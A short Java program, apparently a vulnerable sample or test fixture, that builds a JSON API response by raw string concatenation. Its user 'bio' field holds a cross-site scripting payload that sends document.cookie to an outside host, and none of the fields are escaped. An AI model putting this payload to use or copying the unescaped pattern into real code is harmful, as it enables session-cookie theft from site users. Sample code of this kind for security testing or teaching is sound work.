import java.util.HashMap;
import java.util.Map;

public class ApiEndpoint {
    public static void main(String[] args) {
        Map<String, String> userData = new HashMap<>();
        userData.put("name", "Alice");
        userData.put("email", "alice@test.com");
        userData.put("bio", "<script>document.location='http://site.com?c='+document.cookie</script>");
        
        StringBuilder jsonResponse = new StringBuilder();
        jsonResponse.append("{");
        jsonResponse.append("\"name\":\"").append(userData.get("name")).append("\",");
        jsonResponse.append("\"email\":\"").append(userData.get("email")).append("\",");
        jsonResponse.append("\"bio\":\"").append(userData.get("bio")).append("\"");
        jsonResponse.append("}");
        
        System.out.println("Content-Type: application/json");
        System.out.println(jsonResponse.toString());
    }
}